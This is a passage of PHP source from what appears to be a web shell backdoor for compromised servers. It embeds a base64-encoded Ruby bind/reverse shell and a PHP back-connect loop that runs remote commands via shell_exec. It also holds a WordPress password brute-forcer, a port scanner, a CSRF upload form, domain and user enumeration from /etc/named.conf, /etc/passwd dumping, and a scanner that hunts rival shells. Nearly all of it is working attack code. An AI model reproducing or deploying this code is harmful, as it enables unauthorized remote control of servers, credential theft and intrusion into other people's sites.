      $becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
      $pbcaak=@fopen('bcruby.rb','w');
      fwrite($pbcaak,$becaak);
      $out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
      sleep(1);
      echo "<center><pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre></center>";
      unlink("bcruby.rb");
      }
      if($_POST['backconnect'] == 'php') {
                  $ip = $_POST['server'];
                  $port = $_POST['port'];
                  $sockfd = fsockopen($ip , $port , $errno, $errstr );
                  if($errno != 0){
                    echo "<br><font color='red'>$errno: $errstr</font>";
                  } else if (!$sockfd)  {
                    $result = "<br><p>Unexpected error has occured, connection may have failed.</p>";
                  } else {
                    fputs ($sockfd ,"
                      \n{#######################################}
                      \n..:: BackConnect PHP By Mr.xBarakuda ::..
                      \n{#######################################}\n");
                    $dir = shell_exec("pwd");
                    $sysinfo = shell_exec("uname -a");
                    $time = shell_exec("time");
                    $len = 1337;
                    fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
                    while(!feof($sockfd)){ $cmdPrompt = 'root@mrxbarakuda:~ $';
                    fputs ($sockfd , $cmdPrompt );
                    $command = fgets($sockfd, $len);
                    fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
                  }
                  fclose($sockfd);
                }
            }
      }
elseif($_GET['do'] == 'kill') {
	if(@unlink(preg_replace('!(d+)s.*!', '', __FILE__)))
			die('<center><h3>Shell removed</h3>Goodbye, Thanks for take my shell today</center>');
		else
			echo '<center>unlink failed!</center>';
}
elseif($_GET['do'] == 'domains'){echo "<center><h3>Domains and Users</h3>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error: can't read [ <font color=red><i>/etc/named.conf</font></i> ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</center>';
}
elseif($_GET['do'] == 'ports') {
    
	if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
        $start = strip_tags($_POST['start']);
        $end = strip_tags($_POST['end']);
        $host = strip_tags($_POST['host']);
        for($i = $start; $i<=$end; $i++){
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if($fp){
                echo '<center>Port '.$i.' is <font color=lime>Open</font></center>';
            }
            flush();
        }
    } else {
	echo '<center><h3>Port Scanner</h3>
	<table><form action="" method="post">
	<br><tr><th><td><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
              Host: <input type="text" name="host" value="localhost"/><br /><br />
              Port start: <input type="text" name="start" value="0"/><br /><br />
              Port end:<input type="text" name="end" value="5000"/><br /><br />
              <input type="submit" value="Scan Ports" />
              </form></center></th></tr></td></table>';

    }
}
elseif($_GET['do'] == 'wpbf') {
include("../head.php");
set_time_limit(0);
error_reporting(0);
class lugi{
 
        private $host;
        private $user;
        private $open;
        private $lista;
 
  public function banner() {
   echo("    <html>
    <head>
    <style type='text/css'>
	
 textarea {
	 	width: 100%;
	height: 400px;
 }
 

    .ext{
        color: blue;
    }
 
    .area{
        width:400px;
        height:350px;
        resize:none;
    }
 
    </style>
    </head>
    <body>
    <h3><center>WordPress Brute Force</center></h3>
    <form action='' method='POST'>
    <center>Host:<input type='text' name='host' class='con7' placeholder='http://lusuka.co.li/' size='40' > </center><br>
    <center>User:<input type='text' name='user' class='con7' value='admin' size='25'>    </center><br>
    <center>Wordlist</center>
    <center><textarea class='form-control con7' rows='10' name='lista'></textarea><br><br><center>
    <center><input type='Submit' class='kntd' value='Start'></center>
    </form>
    </body>
   </html>");

}
 
    public function extract_post() {
         $this->host = $_POST["host"];
         $this->user = $_POST["user"];
         $this->open = $_POST["lista"];
       }
 
       public function Xregex() {
         if(preg_match("@/wp-login.php@", $this->host)) {
             return true;
         } else {
            $this->host = $_POST["host"]."/wp-login.php";
         }
     }
 
      public function brute() {
           $lista = array_filter(explode("n", $this->open));
           foreach($lista as $this->lista) {
           for($i=0; $i < count($this->lista); $i++) {
                        $this->Xcurl();
                     }
              }
       }
 
        private function cool() {
            echo "[+] Host:"."<font color='white'>{$this->host}</font>";
            echo " <br/>[+] User:"."<font color='white'>{$this->user}</font>";
            echo " <br/>[+] Pass:"."<font color='white'>{$this->lista}</font>";
        }
 
        private function Xcurl() {
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $this->host);
            curl_setopt($curl, CURLOPT_USERAGENT, $this->useragent);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "log=$this->user&pwd=$this->lista&wp-submit=Login&redirect_to=$this->host/wp-admin/");
            $exec = curl_exec($curl);
            $http = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            $this->cool();
            if($http == 302) {
                 echo "<font color='lime'> <br/>[+] Success [+] Tinggal Login Aja</font><br>";
                 break;
            } else {
                echo "<font color='red'><br/>[+] Failed</font><br>";
            }
                curl_close($curl);
        }
}
 
$wp = new lugi();
$wp->useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0";
$wp->banner();
$wp->extract_post();
$wp->Xregex();
$wp->brute();
        
echo "<br>";
}
elseif($_GET['do'] == 'csrf') {
?>
<center><h3> CSRF ONLINE</h3>
<p>Post File Type: Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</p>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="data" size="50" height="10" placeholder="Lihat Diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="go" value="Lock!">
</form></center>
<?php
$url = $_POST['url'];
$data = $_POST['data'];
$submit = $_POST['go'];
if($submit) {
    echo "<center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input type='submit' name='ok' value='Upload'></form></center>";
}
?>
<?php
}
elseif ($_GET['do'] == 'hashid'){
if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult = "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Entered";
	}
	
	?>
<center>
<form action="" method="post"><tr>
<table class="tabnet">
<th colspan="5"><h3>Hash Identification</th></h3>
<tr class="optionstr"><b><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
</table></tr></form>
</center>
<?php
}
elseif($_GET['do'] == 'shellscan') {
    ?>
  <script language="javascript" type="text/javascript">
    function MM_openBrWindow(c,a,b){window.open(c,a,b)}
  </script>
  <style type="text/css">
    .single{border: 1px solid #00ff00; box-shadow: 0px 0px 15px #55FF55; padding: 5px;}
    .me{font-size: 12px; font-family: Share Tech Mono; color: #ccff99; border: 0px; padding: 3px;}
    .isi{padding: 2px; border: 1px solid #666666; font-family: Share Tech Mono; color: #ccff99; background-color: #666666; font-size: 10px; font-weight: bold;}
    #patch {position: absolute; height: 1; width: 1px; top:0; left:0;}
  </style>
  </head>
  <body>
    <center>
      <h3 style="color: white;">Shell Scanner</h3>
    </center>
    <?php
      if(isset($_REQUEST['edit']) && $_REQUEST['edit']=='file'){
         if(isset($_POST['yes'])){
            $filename = $_GET['file'];
            echo "<br><br><br><font color=red size=3><b><center>".$filename." deleted...</b></font><br><br><br><br><br><br><br>";
            unlink($filename);
            echo "<META HTTP-EQUIV=Refresh CONTENT=\"2; URL=javascript:window.close();\">";
         }else{
            if($_POST['update']) {
               $filename = $_POST['file'];
               if(is_writable($filename)) {
                  $handle = fopen($filename, "w+");
                  $isi=$_POST['content'];
                  fwrite($handle, stripslashes($isi));
                  fclose($handle);
                  $stat= "<center><strong>edited successfully<br>";
               } else {
                  $stat= "<center><font color=red><strong>Error! File may not be writable.</font></center>";
               }
            }
            if($_POST['close']) {
               echo "<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=javascript:window.close();\">";
            }
            $filename = $_GET['file'];
            if (file_exists($filename)){
               $vuln = $_GET['bug'];
               $handle = fopen($filename, "r");
               $contents = fread($handle, filesize($filename));
            ?>
    <center>
      <table>
        <tr>
          <td align="left" class="me"><strong><?=$filename?>&nbsp;&nbsp;>> Contains :&nbsp;<?=$vuln?></strong></td>
        </tr>
        <tr>
          <td class="me">
            <form method="post" action="">
              <input type="hidden" name="file" value="<?=$filename?>">
              <textarea name="content" cols="80" rows="15"><?=htmlspecialchars($contents)?></textarea>
              <br>
          </td>
        </tr>
        <tr><td align="center" class="me">
        <?php
          if($_POST['delete']) {
             echo "Are you sure to delete ".$filename." ?";
          ?>
        <tr><td align="center" class="me">
        <input type="submit" name="yes" value=" Y E S ">
        <input type="submit" name="no" value=" N O ">
        </td></tr>
        <?php
          }else{
          echo $stat;
          ?>
        </td></tr>
        <tr><td align="right" class="me">
        <input type="submit" name="close" value=" C l o s e ">
        <input type="submit" name="delete" value=" D e l e t e ">
        <input type="submit" name="update" value=" S a v e ">
        </td></tr>
        <?php
          }
          fclose($handle);
          ?>
      </table>
      </form>
      <?php
        }else{
        echo "<br><br><br><font color=red size=3><b><center>".$filename." not exist...</b></font><br><br><br><br><br><br><br>";
        echo "<META HTTP-EQUIV=Refresh CONTENT=\"4; URL=javascript:window.close();\">";
        }
        ?>
    </center>
    <?php
      }
      }elseif(isset($_POST['Submit'])){
         $ceks = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
         foreach($ceks as $ceker){
            if($_POST[$ceker]<>""){
               $six.=$_POST[$ceker].".";
            }
         }
      $cek = explode('.', $six);
      
      function ListFiles($dir) {
          if($dh = opendir($dir)) {
      
              $files = Array();
              $inner_files = Array();
      
              while($file = readdir($dh)) {
                  if($file != "." && $file != "..") {
                      if(is_dir($dir . "/" . $file)) {
                          $inner_files = ListFiles($dir . "/" . $file);
                          if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                      } else {
                          array_push($files, $dir . "/" . $file);
                      }
                  }
              }
      
              closedir($dh);
              return $files;
          }
      }
         ?>
    <center>
    <table border="0" width="90%" cellpadding="5">
      <tr>
        <td class="me" align="right" width="30"><b>No</b></td>
        <td class="me" align="center" width="105"><b>Type</b></td>
        <td class="me" align="center"><b>File&nbsp;&nbsp;Location</b></td>
        <td class="me" align="center" width="150"><b>Last&nbsp;&nbsp;Edit</b></td>
        <td class="me" align="right" width="80"><b>File&nbsp;&nbsp;Size</b></td>
      </tr>
      <br>
      <?php
        $target=$_SERVER['DOCUMENT_ROOT'];
           foreach (ListFiles($target) as $key=>$file){
              $nFile = substr($file, -4, 4);
              if($nFile == ".php"){
                 if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']){
                 }else{
                    $ops = @file_get_contents($file);
                    $op=strtolower($ops);
                    $arr = array('c99_buff_prepare' => 'c 9 9',
                              'abcr57' => 'r 5 7');
                    $sis=0;
                    if($op)
                    $size=filesize($file);
                    $last_modified = filemtime($file);
                    $last=date("M-d-Y H:i", $last_modified);
                    foreach($arr as $key => $val) {
                       if(@preg_match("/$key/", $op)) {
                          $sis=1;
                          $i++;
                          ?>
      <tr style="background-color:Your background Color" onMouseOver="mover(this)" onmouseout="mout(this)">
        <td align="right">
          <font color="red">
            <blink><?=$i?></blink>
          </font>
        </td>
        <td align="center">
          <font color="red">
            <blink><?=$val?></blink>
          </font>
        </td>
        <td align="left">
          <blink>
            <a href="#" class="abunai" onClick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
          </blink>
        </td>
        <td align="center">
          <font color="red">
            <blink><?=$last?> GMT+9</blink>
          </font>
        </td>
        <td align="right">
          <font color="red">
            <blink><?=$size?> byte</blink>
          </font>
        </td>
        <script language="javascript">var bgcolor="transparent";var change_color="#444444";function mover(a){a.style.backgroundColor=change_color}function mout(a){a.style.backgroundColor=bgcolor}</script>
      </tr>
      <?php
        }
        }
        if($sis<>"1"){
        if((@preg_match("/system\((.*?)\)/", $op))&&(@preg_match("/<pre>/", $op))&&(@preg_match("/empty\((.*?)\)/", $op))) {
           $sis="2";
           $i++;
           $val="hidden shell";
           ?>
      <tr style="background-color:Your background Color" onMouseOver="mover(this)" onmouseout="mout(this)">
        <td align="right"><font color="#A0CE4E"><?=$i?></font></td>
        <td align="center"><font color="#A0CE4E"><?=$val?></font></td>
        <td align="left">
          <a href="#" class="xxx" onClick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$val?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
        </td>
        <td align="center"><font color="#A0CE4E"><?=$last?> GMT+9</font></td>
        <td align="right"><font color="#A0CE4E"><?=$size?> byte</font></td>
        <script language="javascript">var bgcolor="transparent";var change_color="#444444";function mover(a){a.style.backgroundColor=change_color}function mout(a){a.style.backgroundColor=bgcolor}</script>
      </tr>
      <?php
        }
        }
        if($sis=="0"){
        foreach($cek as $bugs) {
         if ($bugs<>""){
        if(@preg_match("/$bugs\((.*?)\)/", $op)) {
           $i++;
           ?>
      <tr style="background-color:Your background Color" onMouseOver="mover(this)" onmouseout="mout(this)">
        <td align="right"><?=$i?></td>
        <td align="center"><?=$bugs?></td>
        <td align="left">
          <a href="#" onClick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$bugs?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
        </td>
        <td align="center"><?=$last?> GMT+9</td>
        <td align="right"><?=$size?> byte</td>
        <script language="javascript">var bgcolor="transparent";var change_color="#444444";function mover(a){a.style.backgroundColor=change_color}function mout(a){a.style.backgroundColor=bgcolor}</script>
      </tr>
      <?php
        }              
        }
        }
        }
        if($_POST['textV']<>""){
        $text=$_POST['textV'];
           if(@preg_match("/$text/", $op)) {
           $i++;
           ?>
      <tr style="background-color:Your background Color" onMouseOver="mover(this)" onmouseout="mout(this)">
        <td align="right"><?=$i?></td>
        <td align="center"><?=$text?></td>
        <td align="left">
          <a href="#" onClick="MM_openBrWindow('?edit=file&file=<?=$file?>&bug=<?=$text?>','File view','status=yes,scrollbars=yes,width=700,height=600')" rel="nofollow"><?=$file?></a>
        </td>
        <td align="center"><?=$last?> GMT+9</td>
        <td align="right"><?=$size?> byte</td>
        <script language="javascript">var bgcolor="transparent";var change_color="#444444";function mover(a){a.style.backgroundColor=change_color}function mout(a){a.style.backgroundColor=bgcolor}</script>
      </tr>
      <?php
        }
        
        
        }
        }
        }
        }
        if($i==0){
        foreach($cek as $bugs) {
        if ($bugs<>""){
        $x++;
        ?>
      <tr style="background-color:Your background Color" onMouseOver="mover(this)" onmouseout="mout(this)">
        <td align="right"><?=$x?></td>
        <td align="center"><?=$bugs?></td>
        <td align="center"> not exist </td>
        <td align="center"> no record </td>
        <td align="right"> -&nbsp;&nbsp;&nbsp;&nbsp;byte </td>
      </tr>
      <?php
        }
        }
        }
        ?>
    </table>
    <?php
      }else{
         $find = array('default','base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
      ?>
    <form id="fCheck" name="fCheck" method="post" action="" autocomplete="off">
      <center>
      <table class="single" width="400" border="1" cellpadding="10">
        <tr>
          <td class="me">
            <center>
            <b>S e l e c t &nbsp;&nbsp;S c a n&nbsp;&nbsp;T y p e :</b><br>
            <table class="me" width="200">
              <tr>
                <td class="me">
                  <script language="javascript">function cekKlik(){if(!document.fCheck.cekV.checked){document.fCheck.textV.disabled=true}else{document.fCheck.textV.disabled=false}if(document.fCheck.cekV.checked){master=master+1}else{if(master>0){master=master-1}else{master=master}}if(master!=0){document.fCheck.Submit.disabled=false}else{document.fCheck.Submit.disabled=true}};</script>
                  <?php
                    //dari sini
                    foreach($find as $bug) {
                    ?>
                  <script language="javascript">/*<![CDATA[*/var master=0;function checkValue<?=$bug?>(){if(document.fCheck.<?=$bug?>.checked){master=master+1;}else{if(master>0){master=master-1;}else{master=master;}}
                    if(master!=0){document.fCheck.Submit.disabled=false;}else{document.fCheck.Submit.disabled=true;}}/*]]>*/
                  </script>
                  <input onClick="checkValue<?=$bug?>()" name="<?=$bug?>" type="checkbox" id="<?=$bug?>" value="<?=$bug?>" />&nbsp;<?=$bug?><br>
                  <?php
                    }
                    ?>
                  <input name="cekV" type="checkbox" onClick="cekKlik()" id="cekV" value="cekV">
                  <input class="isi" disabled="disabled" name="textV" value="other key word" onFocus="this.select()" type="text" id="textV">
                  <br><br>
                  <input type="hidden" name="asal" value="abcd">
                  <input disabled="disabled" type="submit" name="Submit" value=" S t a r t&nbsp;&nbsp;S c a n " />
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </form>
    <?
    }
    ?>
<?php
}
elseif($_GET['do'] == 'hashgen') {
$submit = $_POST['enter'];
if (isset($submit)) {
$pass = $_POST['password']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
$hash = md5($pass); // md5 hash #1
$md4 = hash("md4", $pass);
$hash_md5 = md5($salt . $pass); // md5 hash with salt #2
$hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
$hash1 = sha1($pass); // sha1 hash #4
$sha256 = hash("sha256", $text);
$hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
$hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
}
echo '<form action="" method="post">';
echo '<center><h3>Hash Generator</h3>';
echo '<table>';
echo 'Masukkan teks yang ingin di encrypt: ';
echo '<input class="inputz" type="text" name="password" size="40">';
echo '<input class="inputzbut" type="submit" name="enter" value="Hash!">';
echo '<br>';
echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
echo 'MD5: <input class=inputz type=text size=50 value='.$hash.'><br><br>';
echo 'MD4: <input class=inputz type=text size=50 value='.$md4 .'><br><br>';
echo 'MD5 with Salt: <input class=inputz type=text size=50 value='.$hash_md5.'><br><br>';
echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value='.$hash_md5_double.'><br><br>';
echo 'Sha1: <input class=inputz type=text size=50 value='.$hash1 .'><br><br>';
echo 'Sha256: <input class=inputz type=text size=50 value='.$sha256.'><br><br>';
echo 'Sha1 with Salt: <input class=inputz type=text size=50 value='.$hash1_sha1.'><br><br>';
echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
}
elseif($_GET['bypass'] == 'etcpass') {
	echo '<center>Bypass /etc/passwd With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With:<table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';

if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
